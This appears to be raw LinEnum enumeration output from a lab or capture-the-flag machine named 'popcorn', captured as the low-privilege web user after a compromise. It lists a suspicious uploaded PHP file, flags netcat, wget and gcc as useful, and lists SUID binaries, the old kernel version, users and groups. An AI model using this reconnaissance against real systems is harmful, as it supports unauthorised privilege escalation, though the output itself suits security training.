+[00;31m[-] Apache user configuration:[00m
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+
+
+[00;31m[-] www home dir contents:[00m
+/var/www/:
+total 24K
+drwxr-xr-x  4 www-data www-data 4.0K Apr 11  2017 .
+drwxr-xr-x 15 root     root     4.0K Mar 17  2017 ..
+-rw-r--r--  1 www-data www-data  177 Mar 17  2017 index.html
+drwxr-xr-x  2 www-data www-data 4.0K Mar 17  2017 rename
+-rw-r--r--  1 www-data www-data   21 Mar 17  2017 test.php
+drwxr-xr-x 15 www-data www-data 4.0K Mar 17  2017 torrent
+
+/var/www/rename:
+total 12K
+drwxr-xr-x 2 www-data www-data 4.0K Mar 17  2017 .
+drwxr-xr-x 4 www-data www-data 4.0K Apr 11  2017 ..
+-rw-r--r-- 1 www-data www-data  247 Mar 17  2017 index.php
+
+/var/www/torrent:
+total 196K
+drwxr-xr-x 15 www-data www-data 4.0K Mar 17  2017 .
+drwxr-xr-x  4 www-data www-data 4.0K Apr 11  2017 ..
+drwxr-xr-x  2 www-data www-data 4.0K Jan 31  2010 PNG
+drwxr-xr-x  4 www-data www-data 4.0K Jun  3  2007 admin
+-rw-r--r--  1 www-data www-data 1.7K Jun  1  2007 browse.php
+-rw-r--r--  1 www-data www-data 3.0K Jun  3  2007 comment.php
+-rw-r--r--  1 www-data www-data 6.6K Apr 11  2017 config.php
+drwxr-xr-x  2 www-data www-data 4.0K Jun  3  2007 css
+drwxr-xr-x  2 www-data www-data 4.0K Jun  3  2007 database
+-rw-r--r--  1 www-data www-data  125 Jan 20  2007 download.php
+-rw-r--r--  1 www-data www-data 1.6K Jun  3  2007 edit.php
+drwxr-xr-x  2 www-data www-data 4.0K Jan 31  2010 health
+-rw-r--r--  1 www-data www-data 3.7K Mar  6  2005 hide.js
+drwxr-xr-x  2 www-data www-data 4.0K Jan 31  2010 images
+-rw-r--r--  1 www-data www-data 1.6K Jun  3  2007 index.php
+drwxr-xr-x  2 www-data www-data 4.0K Jun  3  2007 js
+drwxr-xr-x  2 www-data www-data 4.0K Jun  3  2007 lib
+-rw-r--r--  1 www-data www-data 1.8K Jan  9  2007 login.php
+-rw-r--r--  1 www-data www-data  329 Dec 28  2006 logout.php
+-rw-r--r--  1 www-data www-data  28K Jan 27  2010 preview.gif
+drwxr-xr-x  2 www-data www-data 4.0K Jun  3  2007 readme
+-rw-r--r--  1 www-data www-data 3.3K Jun 10  2005 rss.php
+-rw-r--r--  1 www-data www-data  573 Nov 29  2006 secure.php
+-rw-r--r--  1 www-data www-data 6.2K Mar  6  2005 sorttable.js
+-rw-r--r--  1 www-data www-data  321 Nov 28  2006 stylesheet.css
+drwxr-xr-x  3 www-data www-data 4.0K Jun  3  2007 templates
+-rw-r--r--  1 www-data www-data 4.1K Dec 28  2006 thumbnail.php
+drwxrwxrwx  2 www-data www-data 4.0K Mar 17  2017 torrents
+-rw-r--r--  1 www-data www-data 7.1K Jun  3  2007 torrents.php
+-rw-r--r--  1 www-data www-data  539 Nov 30  2006 update_stats.php
+-rw-r--r--  1 www-data www-data  986 Jun  3  2007 update_stats2.php
+drwxrwxrwx  2 www-data www-data 4.0K Feb 26 02:55 upload
+-rw-r--r--  1 www-data www-data  15K Mar 17  2017 upload.php
+-rw-r--r--  1 www-data www-data 1.5K Jun  3  2007 upload_file.php
+drwxr-xr-x  3 www-data www-data 4.0K Jan 31  2010 users
+-rw-r--r--  1 www-data www-data 3.5K Mar  6  2005 validator.php
+
+/var/www/torrent/PNG:
+total 268K
+drwxr-xr-x  2 www-data www-data 4.0K Jan 31  2010 .
+drwxr-xr-x 15 www-data www-data 4.0K Mar 17  2017 ..
+-rw-r--r--  1 www-data www-data 257K May 31  2007 banner.png
+
+/var/www/torrent/admin:
+total 68K
+drwxr-xr-x  4 www-data www-data 4.0K Jun  3  2007 .
+drwxr-xr-x 15 www-data www-data 4.0K Mar 17  2017 ..
+-rw-r--r--  1 www-data www-data 3.0K Jun  3  2007 admin.php
+-rw-r--r--  1 www-data www-data  406 Mar  6  2005 emailUsers.php
+drwxr-xr-x  2 www-data www-data 4.0K Jan 31  2010 images
+-rw-r--r--  1 www-data www-data  15K Jun  3  2007 index.php
+-rw-r--r--  1 www-data www-data  434 Mar  6  2005 messageBoard.php
+-rw-r--r--  1 www-data www-data 6.2K Mar  6  2005 orderusers.js
+-rw-r--r--  1 www-data www-data 3.1K Mar  6  2005 siteUpdate.php
+drwxr-xr-x  2 www-data www-data 4.0K Jun  3  2007 templates
+-rw-r--r--  1 www-data www-data 3.1K Nov 29  2006 uda.php
+-rw-r--r--  1 www-data www-data 4.7K Mar 11  2005 users.php
+
+/var/www/torrent/admin/images:
+total 76K
+drwxr-xr-x 2 www-data www-data 4.0K Jan 31  2010 .
+drwxr-xr-x 4 www-data www-data 4.0K Jun  3  2007 ..
+-rw-r--r-- 1 www-data www-data 2.6K Jun  3  2007 add categories.jpg
+-rw-r--r-- 1 www-data www-data 2.2K Jun  3  2007 add news.jpg
+-rw-r--r-- 1 www-data www-data 1.9K Jun  3  2007 add subcategories.jpg
+-rw-r--r-- 1 www-data www-data 1.7K Jun  3  2007 ban users.jpg
+-rw-r--r-- 1 www-data www-data 1.8K Jun  3  2007 browse.jpg
+-rw-r--r-- 1 www-data www-data 2.4K Jun  3  2007 comments.jpg
+-rw-r--r-- 1 www-data www-data 2.8K Jun  3  2007 dead torrents.jpg
+-rw-r--r-- 1 www-data www-data 2.3K Jun  3  2007 edit news.jpg
+-rw-r--r-- 1 www-data www-data 1.1K Jun  3  2007 files management.gif
+-rw-r--r-- 1 www-data www-data 1.9K Jun  3  2007 hack.jpg
+-rw-r--r-- 1 www-data www-data 2.5K Jun  3  2007 list categories.jpg
+-rw-r--r-- 1 www-data www-data 2.4K Jun  3  2007 list torrents.jpg
+-rw-r--r-- 1 www-data www-data 2.3K Jan  4  2007 logout.png
+-rw-r--r-- 1 www-data www-data 1.1K Jun  3  2007 news management.gif
+-rw-r--r-- 1 www-data www-data 1.1K Jun  3  2007 users management.gif
+-rw-r--r-- 1 www-data www-data 1.9K Jun  3  2007 users.jpg
+-rw-r--r-- 1 www-data www-data 2.7K Jan  4  2007 users.png
+
+/var/www/torrent/admin/templates:
+total 100K
+drwxr-xr-x 2 www-data www-data 4.0K Jun  3  2007 .
+drwxr-xr-x 4 www-data www-data 4.0K Jun  3  2007 ..
+-rw-r--r-- 1 www-data www-data  524 Jan  8  2007 add_cat.php
+-rw-r--r-- 1 www-data www-data  770 Jan  5  2007 add_subcat.php
+-rw-r--r-- 1 www-data www-data  779 Dec 26  2006 admin.php
+-rw-r--r-- 1 www-data www-data  515 Nov 30  2006 ban_list.php
+-rw-r--r-- 1 www-data www-data  808 Jan  3  2007 comments_list.php
+-rw-r--r-- 1 www-data www-data  852 Mar 23  2005 edit_news.php
+-rw-r--r-- 1 www-data www-data  887 Jun  3  2007 footer.php
+-rw-r--r-- 1 www-data www-data  509 Jan  3  2007 hack_list.php
+-rw-r--r-- 1 www-data www-data 8.1K Jun  3  2007 header.php
+-rw-r--r-- 1 www-data www-data  495 Mar 23  2005 insert_news.php
+-rw-r--r-- 1 www-data www-data 1012 Jan  8  2007 list_cat.php
+-rw-r--r-- 1 www-data www-data  819 Jan 11  2007 list_users.php
+-rw-r--r-- 1 www-data www-data 1.8K Mar 12  2005 login_form2.php
+-rw-r--r-- 1 www-data www-data  11K Jan  8  2007 modify.php
+-rw-r--r-- 1 www-data www-data  517 Mar 23  2005 news.php
+-rw-r--r-- 1 www-data www-data  289 Mar 11  2005 subcategories.php
+-rw-r--r-- 1 www-data www-data 1.2K Mar  9  2005 torrent_details.php
+-rw-r--r-- 1 www-data www-data 1.1K Jun  3  2007 torrents_list.php
+-rw-r--r-- 1 www-data www-data 1.1K Nov 29  2006 torrents_list_date.php
+
+/var/www/torrent/css:
+total 12K
+drwxr-xr-x  2 www-data www-data 4.0K Jun  3  2007 .
+drwxr-xr-x 15 www-data www-data 4.0K Mar 17  2017 ..
+-rw-r--r--  1 www-data www-data 2.1K Apr  4  2006 lightbox.css
+
+/var/www/torrent/database:
+total 20K
+drwxr-xr-x  2 www-data www-data 4.0K Jun  3  2007 .
+drwxr-xr-x 15 www-data www-data 4.0K Mar 17  2017 ..
+-rw-r--r--  1 www-data www-data 9.6K Jun  3  2007 th_database.sql
+
+/var/www/torrent/health:
+total 28K
+drwxr-xr-x  2 www-data www-data 4.0K Jan 31  2010 .
+drwxr-xr-x 15 www-data www-data 4.0K Mar 17  2017 ..
+-rw-r--r--  1 www-data www-data  106 Jan  6  2007 1.gif
+-rw-r--r--  1 www-data www-data  112 Jan  6  2007 2.gif
+-rw-r--r--  1 www-data www-data  118 Jan  6  2007 3.gif
+-rw-r--r--  1 www-data www-data  120 Jan  6  2007 4.gif
+-rw-r--r--  1 www-data www-data  125 Jan  6  2007 5.gif
+
+/var/www/torrent/images:
+total 488K
+drwxr-xr-x  2 www-data www-data 4.0K Jan 31  2010 .
+drwxr-xr-x 15 www-data www-data 4.0K Mar 17  2017 ..
+-rw-r--r--  1 www-data www-data  32K May 31  2007 admin.png
+-rw-r--r--  1 www-data www-data 1.4K Jun  2  2007 back.gif
+-rw-r--r--  1 www-data www-data   81 May 31  2007 background.gif
+-rw-r--r--  1 www-data www-data  19K Jun  1  2007 banner.jpg
+-rw-r--r--  1 www-data www-data   43 Mar 27  2006 blank.gif
+-rw-r--r--  1 www-data www-data  366 May 31  2007 button-bg.jpg
+-rw-r--r--  1 www-data www-data  31K Jan  4  2007 button.png
+-rw-r--r--  1 www-data www-data  222 Mar 27  2006 close.gif
+-rw-r--r--  1 www-data www-data  979 Apr  4  2006 closelabel.gif
+-rw-r--r--  1 www-data www-data 2.5K Jun  1  2007 control panel.gif
+-rw-r--r--  1 www-data www-data  925 Dec 31  2005 details.png
+-rw-r--r--  1 www-data www-data 2.2K Jun  3  2007 download details.jpg
+-rw-r--r--  1 www-data www-data 1.1K Jun  1  2007 download.png
+-rw-r--r--  1 www-data www-data 3.0K Jun  3  2007 edit.jpg
+-rw-r--r--  1 www-data www-data  917 Nov 30  2006 feed.png
+-rw-r--r--  1 www-data www-data  14K May 31  2007 feed2.png
+-rw-r--r--  1 www-data www-data 2.8K Jun  3  2007 files screenshot.jpg
+-rw-r--r--  1 www-data www-data  969 Jan  5  2007 folder.png
+-rw-r--r--  1 www-data www-data 1.1K Jan  5  2007 folder2.png
+-rw-r--r--  1 www-data www-data 3.6K Jun  3  2007 globe.jpg
+-rw-r--r--  1 www-data www-data 2.7K Jun  2  2007 green mark.jpg
+-rw-r--r--  1 www-data www-data  579 Jan 23  2007 leftcor.png
+-rw-r--r--  1 www-data www-data 4.2K Jun  1  2007 link-about.png
+-rw-r--r--  1 www-data www-data 2.3K May 31  2007 link-browse.png
+-rw-r--r--  1 www-data www-data 2.3K Jun  1  2007 link-development.png
+-rw-r--r--  1 www-data www-data 2.5K May 31  2007 link-faq.png
+-rw-r--r--  1 www-data www-data 3.7K May 31  2007 link-forum.png
+-rw-r--r--  1 www-data www-data 2.3K May 31  2007 link-home.png
+-rw-r--r--  1 www-data www-data 2.9K May 31  2007 link-news.png
+-rw-r--r--  1 www-data www-data 2.2K May 31  2007 link-stats.png
+-rw-r--r--  1 www-data www-data 2.3K May 31  2007 link-upload.png
+-rw-r--r--  1 www-data www-data 2.8K Mar 27  2006 loading.gif
+-rw-r--r--  1 www-data www-data  32K May 31  2007 login.png
+-rw-r--r--  1 www-data www-data  415 Jan  1  2007 login2.gif
+-rw-r--r--  1 www-data www-data 2.2K May 31  2007 login2.jpg
+-rw-r--r--  1 www-data www-data 4.6K May 31  2007 logo.png
+-rw-r--r--  1 www-data www-data  33K May 31  2007 logout.png
+-rw-r--r--  1 www-data www-data  35K May 31  2007 mytorrents.png
+-rw-r--r--  1 www-data www-data 1.9K Jun  1  2007 news-arrow.gif
+-rw-r--r--  1 www-data www-data  363 Jun  1  2007 orange bg.jpg
+-rw-r--r--  1 www-data www-data  480 Jan 22  2007 page_bg.jpg
+-rw-r--r--  1 www-data www-data   51 Mar 12  2005 reg.gif
+-rw-r--r--  1 www-data www-data   62 Mar 12  2005 regb.gif
+-rw-r--r--  1 www-data www-data 3.7K Jun  3  2007 register user.gif
+-rw-r--r--  1 www-data www-data  33K May 31  2007 register.png
+-rw-r--r--  1 www-data www-data 1.5K Jan 22  2007 rightcor.png
+-rw-r--r--  1 www-data www-data 1.5K May 31  2007 search.jpg
+-rw-r--r--  1 www-data www-data 2.0K Jun  3  2007 seeds.jpg
+-rw-r--r--  1 www-data www-data   75 Jan  1  2007 sidebarspace.gif
+-rw-r--r--  1 www-data www-data 3.1K Jun  3  2007 statics.jpg
+-rw-r--r--  1 www-data www-data  13K Jun  2  2007 stats.png
+-rw-r--r--  1 www-data www-data 1.2K Jan  4  2007 th.png
+-rw-r--r--  1 www-data www-data  379 May 31  2007 top-bg.jpg
+-rw-r--r--  1 www-data www-data  364 May 31  2007 top-end.jpg
+-rw-r--r--  1 www-data www-data  35K May 31  2007 updatestats.png
+
+/var/www/torrent/js:
+total 116K
+drwxr-xr-x  2 www-data www-data 4.0K Jun  3  2007 .
+drwxr-xr-x 15 www-data www-data 4.0K Mar 17  2017 ..
+-rw-r--r--  1 www-data www-data  32K Jan 25  2006 effects.js
+-rw-r--r--  1 www-data www-data  21K Dec 28  2006 lightbox.js
+-rw-r--r--  1 www-data www-data  47K Mar 10  2006 prototype.js
+-rw-r--r--  1 www-data www-data 2.2K Jan 25  2006 scriptaculous.js
+
+/var/www/torrent/lib:
+total 48K
+drwxr-xr-x  2 www-data www-data 4.0K Jun  3  2007 .
+drwxr-xr-x 15 www-data www-data 4.0K Mar 17  2017 ..
+-rw-r--r--  1 www-data www-data 5.0K Mar  6  2005 BDecode.php
+-rw-r--r--  1 www-data www-data 2.4K Mar  6  2005 BEncode.php
+-rw-r--r--  1 www-data www-data 3.9K Mar  6  2005 dblib.php
+-rw-r--r--  1 www-data www-data 2.5K Jun  2  2007 getscrape.php
+-rw-r--r--  1 www-data www-data 6.2K Mar 12  2005 stdlib.php
+-rw-r--r--  1 www-data www-data 8.9K Jun  3  2007 webtorrent.php
+
+/var/www/torrent/readme:
+total 28K
+drwxr-xr-x  2 www-data www-data 4.0K Jun  3  2007 .
+drwxr-xr-x 15 www-data www-data 4.0K Mar 17  2017 ..
+-rw-r--r--  1 www-data www-data  13K Jan  6  2007 license.txt
+-rw-r--r--  1 www-data www-data 3.4K Jun  3  2007 readme.html
+
+/var/www/torrent/templates:
+total 116K
+drwxr-xr-x  3 www-data www-data 4.0K Jun  3  2007 .
+drwxr-xr-x 15 www-data www-data 4.0K Mar 17  2017 ..
+-rw-r--r--  1 www-data www-data  850 Jun  3  2007 about.php
+-rw-r--r--  1 www-data www-data 2.6K Jun  2  2007 colours.css
+-rw-r--r--  1 www-data www-data 2.3K Jun  2  2007 directory.php
+drwxr-xr-x  2 www-data www-data 4.0K Jun  3  2007 email
+-rw-r--r--  1 www-data www-data 3.7K Dec 26  2006 faq.php
+-rw-r--r--  1 www-data www-data  901 Jun  3  2007 footer.php
+-rw-r--r--  1 www-data www-data  320 Mar 12  2005 form_header.php
+-rw-r--r--  1 www-data www-data  120 Jan  3  2007 hack.php
+-rw-r--r--  1 www-data www-data 8.1K Jun  9  2007 header.php
+-rw-r--r--  1 www-data www-data   98 Nov 29  2006 insufficient_privileges.php
+-rw-r--r--  1 www-data www-data 5.1K Jun  3  2007 layout.css
+-rw-r--r--  1 www-data www-data 1.7K Jun  2  2007 login_form.php
+-rw-r--r--  1 www-data www-data  13K Jun  3  2007 modify.php
+-rw-r--r--  1 www-data www-data  415 Jun  2  2007 news.php
+-rw-r--r--  1 www-data www-data  693 Jun  1  2007 news2.php
+-rw-r--r--  1 www-data www-data 1.1K Jan 25  2007 report_form.php
+-rw-r--r--  1 www-data www-data  765 Jun  2  2007 stats.php
+-rw-r--r--  1 www-data www-data 1.3K Jun  2  2007 subcategories.php
+-rw-r--r--  1 www-data www-data 3.9K Jun  3  2007 torrent_details.php
+-rw-r--r--  1 www-data www-data 1.7K Jun  1  2007 torrents_list.php
+-rw-r--r--  1 www-data www-data 2.1K Jun  3  2007 torrents_list_date.php
+
+/var/www/torrent/templates/email:
+total 12K
+drwxr-xr-x 2 www-data www-data 4.0K Jun  3  2007 .
+drwxr-xr-x 3 www-data www-data 4.0K Jun  3  2007 ..
+-rw-r--r-- 1 www-data www-data  272 Apr  9  2005 reset_password.php
+
+/var/www/torrent/torrents:
+total 244K
+drwxrwxrwx  2 www-data www-data 4.0K Mar 17  2017 .
+drwxr-xr-x 15 www-data www-data 4.0K Mar 17  2017 ..
+-rw-r--r--  1 www-data www-data 230K Mar 17  2017 723bc28f9b6f924cca68ccdff96b6190566ca6b4.btf
+-rw-r--r--  1 www-data www-data    6 Mar  6  2005 index.php
+
+/var/www/torrent/upload:
+total 56K
+drwxrwxrwx  2 www-data www-data 4.0K Feb 26 02:55 .
+drwxr-xr-x 15 www-data www-data 4.0K Mar 17  2017 ..
+-rw-r--r--  1 www-data www-data 2.5K Feb 26 02:52 723bc28f9b6f924cca68ccdff96b6190566ca6b4.gif
+-rw-r--r--  1 www-data www-data   32 Feb 26 02:55 723bc28f9b6f924cca68ccdff96b6190566ca6b4.php
+-rw-r--r--  1 www-data www-data 2.3K Feb 26 02:55 723bc28f9b6f924cca68ccdff96b6190566ca6b4.png
+-rw-r--r--  1 www-data www-data  33K Jun  2  2007 noss.png
+
+/var/www/torrent/users:
+total 60K
+drwxr-xr-x  3 www-data www-data 4.0K Jan 31  2010 .
+drwxr-xr-x 15 www-data www-data 4.0K Mar 17  2017 ..
+-rw-r--r--  1 www-data www-data 2.2K Mar  6  2005 change_password.php
+-rw-r--r--  1 www-data www-data 1.8K Mar  6  2005 change_settings.php
+-rw-r--r--  1 www-data www-data  680 Mar  6  2005 change_settings_form.php
+-rw-r--r--  1 www-data www-data 1.6K Mar 11  2005 forgot_password.php
+-rw-r--r--  1 www-data www-data  701 Jul  7  2006 img.jpg
+-rw-r--r--  1 www-data www-data 6.8K Jan 24  2007 index.php
+-rw-r--r--  1 www-data www-data  822 Jul  7  2006 php_captcha.php
+-rw-r--r--  1 www-data www-data 2.3K Jan 24  2007 registration.php
+drwxr-xr-x  2 www-data www-data 4.0K Jun  3  2007 templates
+-rw-r--r--  1 www-data www-data  11K Mar  6  2005 validation_class.php
+
+/var/www/torrent/users/templates:
+total 36K
+drwxr-xr-x 2 www-data www-data 4.0K Jun  3  2007 .
+drwxr-xr-x 3 www-data www-data 4.0K Jan 31  2010 ..
+-rw-r--r-- 1 www-data www-data  690 Mar 12  2005 change_password_form.php
+-rw-r--r-- 1 www-data www-data  667 Mar  6  2005 change_settings_form.php
+-rw-r--r-- 1 www-data www-data 1.2K Mar 11  2005 forgot_password_form.php
+-rw-r--r-- 1 www-data www-data  107 Mar  6  2005 forgot_password_success.php
+-rw-r--r-- 1 www-data www-data  704 Jan 11  2007 registration_success.php
+-rw-r--r-- 1 www-data www-data 1.4K Jun  3  2007 signup_form.php
+-rw-r--r-- 1 www-data www-data   83 Mar 21  2005 users_menu.php
+
+
+[00;33m### INTERESTING FILES ####################################[00m
+[00;31m[-] Useful file locations:[00m
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/gcc
+
+
+[00;31m[-] Installed compilers:[00m
+ii  g++                                 4:4.4.1-1ubuntu2                  The GNU C++ compiler
+ii  g++-4.4                             4.4.1-4ubuntu9                    The GNU C++ compiler
+ii  gcc                                 4:4.4.1-1ubuntu2                  The GNU C compiler
+ii  gcc-4.4                             4.4.1-4ubuntu9                    The GNU C compiler
+
+
+[00;31m[-] Can we read/write sensitive files:[00m
+-rw-r--r-- 1 root root 1031 Mar 17  2017 /etc/passwd
+-rw-r--r-- 1 root root 691 Mar 17  2017 /etc/group
+-rw-r--r-- 1 root root 497 Mar 17  2017 /etc/profile
+-rw-r----- 1 root shadow 838 Mar 17  2017 /etc/shadow
+
+
+[00;31m[-] SUID files:[00m
+-rwsr-xr-x 1 root root 30492 May 12  2009 /bin/ping6
+-rwsr-xr-x 1 root root 34696 May 12  2009 /bin/ping
+-rwsr-xr-x 1 root root 47096 Oct 23  2009 /bin/umount
+-rwsr-xr-x 1 root root 72188 Oct 23  2009 /bin/mount
+-rwsr-xr-x 1 root root 22064 Mar  5  2009 /bin/fusermount
+-rwsr-xr-x 1 root root 31124 Jul 31  2009 /bin/su
+-rwsr-xr-x 1 root root 9548 Jan 11  2011 /usr/lib/pt_chown
+-r-sr-xr-x 1 root root 9532 Oct 26  2020 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+-r-sr-xr-x 1 root root 14320 Oct 26  2020 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+-rwsr-xr-x 1 root root 5544 Apr 29  2009 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 179120 Oct 22  2009 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 40332 Jul 31  2009 /usr/bin/chfn
+-rwsr-xr-x 1 root root 30936 Jul 31  2009 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 52036 Nov  5  2008 /usr/bin/mtr
+-rwsr-xr-x 1 root root 31756 Jul 31  2009 /usr/bin/chsh
+-rwsr-xr-x 2 root root 123448 Jun 22  2009 /usr/bin/sudo
+-rwsr-xr-x 1 root root 13948 May 12  2009 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root root 41292 Jul 31  2009 /usr/bin/passwd
+-rwsr-xr-x 1 root root 13816 May 12  2009 /usr/bin/arping
+-rwsr-xr-x 1 root root 57964 Jul 31  2009 /usr/bin/gpasswd
+-rwsr-xr-x 2 root root 123448 Jun 22  2009 /usr/bin/sudoedit
+-rwsr-sr-x 1 daemon daemon 46964 Sep 15  2009 /usr/bin/at
+-rwsr-xr-- 1 root dip 277352 Feb 20  2009 /usr/sbin/pppd
+-rwsr-sr-x 1 libuuid libuuid 13848 Oct 23  2009 /usr/sbin/uuidd
+
+
+[00;31m[-] SGID files:[00m
+-rwxr-sr-x 1 root shadow 30400 Sep  4  2009 /sbin/unix_chkpwd
+-rwxr-sr-x 1 root mlocate 34408 Apr 29  2009 /usr/bin/mlocate
+-rwxr-sr-x 1 root ssh 79912 Oct 22  2009 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root crontab 31712 Sep 15  2009 /usr/bin/crontab
+-rwxr-sr-x 1 root shadow 57580 Jul 31  2009 /usr/bin/chage
+-rwxr-sr-x 3 root mail 9896 Jul  6  2009 /usr/bin/mail-lock
+-rwxr-sr-x 3 root mail 9896 Jul  6  2009 /usr/bin/mail-unlock
+-rwxr-sr-x 1 root tty 13864 Oct 23  2009 /usr/bin/wall
+-rwxr-sr-x 3 root mail 9896 Jul  6  2009 /usr/bin/mail-touchlock
+-rwxr-sr-x 1 root tty 9704 May  9  2009 /usr/bin/bsd-write
+-rwxr-sr-x 1 root mail 14280 Nov 18  2008 /usr/bin/dotlockfile
+-rwxr-sr-x 1 root utmp 361080 Jul  6  2009 /usr/bin/screen
+-rwxr-sr-x 1 root shadow 18128 Jul 31  2009 /usr/bin/expiry
+-rwsr-sr-x 1 daemon daemon 46964 Sep 15  2009 /usr/bin/at
+-rwsr-sr-x 1 libuuid libuuid 13848 Oct 23  2009 /usr/sbin/uuidd
+
+
+[00;31m[-] World-writable files (excluding /proc and /sys):[00m
+-rw-rw-rw- 1 root root 165 Feb 26 02:19 /var/run/motd
+
+
+[00;31m[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems[00m
+# /etc/fstab: static file system information.
+#
+# Use 'blkid -o value -s UUID' to print the universally unique identifier
+# for a device; this may be used with UUID= as a more robust way to name
+# devices that works even if disks are added and removed. See fstab(5).
+#
+# <file system> <mount point>   <type>  <options>       <dump>  <pass>
+proc            /proc           proc    defaults        0       0
+/dev/mapper/popcorn-root /               ext4    errors=remount-ro 0       1
+# /boot was on /dev/sda5 during installation
+UUID=840b41db-1f13-4aa6-9f4b-38dfaf65c65c /boot           ext2    defaults        0       2
+/dev/mapper/popcorn-swap_1 none            swap    sw              0       0
+/dev/scd0       /media/cdrom0   udf,iso9660 user,noauto,exec,utf8 0       0
+/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0
+
+
+[-] Can't search *.conf files as no keyword was entered
+
+[-] Can't search *.php files as no keyword was entered
+
+[-] Can't search *.log files as no keyword was entered
+
+[-] Can't search *.ini files as no keyword was entered
+
+[00;31m[-] All *.conf files in /etc (recursive 1 level):[00m
+-rw-r--r-- 1 root root 34 Mar 17  2017 /etc/ld.so.conf
+-rw-r--r-- 1 root root 1173 Oct 15  2009 /etc/rsyslog.conf
+-rw-r--r-- 1 root root 92 Apr 27  2009 /etc/host.conf
+-rw-r--r-- 1 root root 248 Apr 29  2009 /etc/updatedb.conf
+-rw-r--r-- 1 root root 599 Aug 20  2009 /etc/logrotate.conf
+-rw-r--r-- 1 root root 4794 Oct  6  2009 /etc/hdparm.conf
+-rw-r--r-- 1 root root 2986 Mar 17  2017 /etc/adduser.conf
+-rw-r--r-- 1 root root 350 Mar 17  2017 /etc/popularity-contest.conf
+-rw-r--r-- 1 root root 600 Aug  3  2009 /etc/deluser.conf
+-rw-r--r-- 1 root root 2969 Oct  2  2009 /etc/debconf.conf
+-rw-r--r-- 1 root root 126 Oct  1  2020 /etc/cvs-pserver.conf
+-rw-r--r-- 1 root root 240 Mar 17  2017 /etc/kernel-img.conf
+-rw-r--r-- 1 root root 15752 Jul 25  2009 /etc/ltrace.conf
+-rw-r--r-- 1 root root 85 Oct  1  2020 /etc/resolv.conf
+-rw-r--r-- 1 root root 2277 Sep 16  2009 /etc/sysctl.conf
+-rw-r--r-- 1 root root 89 Oct  1  2020 /etc/cvs-cron.conf
+-rw-r----- 1 root fuse 216 Mar  5  2009 /etc/fuse.conf
+-rw-r--r-- 1 root root 645 May  2  2009 /etc/ts.conf
+-rw-r--r-- 1 root root 6332 Mar 17  2017 /etc/ca-certificates.conf
+-rw-r--r-- 1 root root 1260 May 30  2008 /etc/ucf.conf
+-rw-r--r-- 1 root root 885 Sep  7  2009 /etc/insserv.conf
+-rw-r--r-- 1 root root 801 Oct 24  2009 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 321 Oct 23  2009 /etc/blkid.conf
+-rw-r--r-- 1 root root 552 Sep  4  2009 /etc/pam.conf
+-rw-r--r-- 1 root root 475 Aug 28  2006 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 2689 Mar 27  2008 /etc/gai.conf
+
+
+[00;31m[-] Location and contents (if accessible) of .bash_history file(s):[00m
+/home/george/.bash_history
+
+
+[00;31m[-] Any interesting mail in /var/mail:[00m
+total 8
+drwxrwsr-x  2 root mail 4096 Mar 17  2017 .
+drwxr-xr-x 15 root root 4096 Mar 17  2017 ..
+
+
+[00;33m### SCAN COMPLETE ####################################[00m
+
+[00;31m#########################################################[00m
+[00;31m#[00m [00;33mLocal Linux Enumeration & Privilege Escalation Script[00m [00;31m#[00m
+[00;31m#########################################################[00m
+[00;33m# www.rebootuser.com[00m
+[00;33m# version 0.982[00m
+
+[-] Debug Info
+[+] Report name = popcorn-26-02-22
+[00;33m[+] Thorough tests = Disabled[00m
+
+
+[00;33mScan started at:
+Sat Feb 26 03:21:24 EET 2022
+[00m
+
+[00;33m### SYSTEM ##############################################[00m
+[00;31m[-] Kernel information:[00m
+Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
+
+
+[00;31m[-] Kernel information (continued):[00m
+Linux version 2.6.31-14-generic-pae (buildd@rothera) (gcc version 4.4.1 (Ubuntu 4.4.1-4ubuntu8) ) #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009
+
+
+[00;31m[-] Specific release information:[00m
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=9.10
+DISTRIB_CODENAME=karmic
+DISTRIB_DESCRIPTION="Ubuntu 9.10"
+
+
+[00;31m[-] Hostname:[00m
+popcorn
+
+
+[00;33m### USER/GROUP ##########################################[00m
+[00;31m[-] Current user/group info:[00m
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+[00;31m[-] Users that have previously logged onto the system:[00m
+Username         Port     From             Latest
+root             tty1                      Tue Oct 27 11:08:55 +0200 2020
+george           tty1                      Fri May  5 23:12:20 +0300 2017
+
+
+[00;31m[-] Who else is logged on:[00m
+ 03:21:24 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+
+
+[00;31m[-] Group memberships:[00m
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
